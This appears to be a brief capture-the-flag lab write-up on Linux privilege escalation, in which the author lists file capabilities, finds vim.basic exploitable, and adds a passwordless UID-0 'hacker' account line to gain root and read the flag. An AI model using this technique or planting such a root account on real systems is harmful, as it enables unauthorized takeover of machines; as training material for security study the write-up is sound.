# [Capabilities](Capabilities.md)
### Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.

Firstly I need to enum the capabilities in this user.

```shell
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 
```
![](Screenshot%202026-08-07%20at%2016.27.57.png)

I saw /usr/bin/vim.basic might be exploit

```shell
getcap /usr/bin/vim.basic
```
 
 and then, added `hacker` as a user having UID = 0

```vim
hacker::0:0:root:/root:/bin/bash
```
![](Screenshot%202026-08-07%20at%2016.37.28.png)
explain: `username : password : uid : gid : comment : home : shell`

Got the flag !

![](Screenshot%202026-08-07%20at%2016.38.06.png)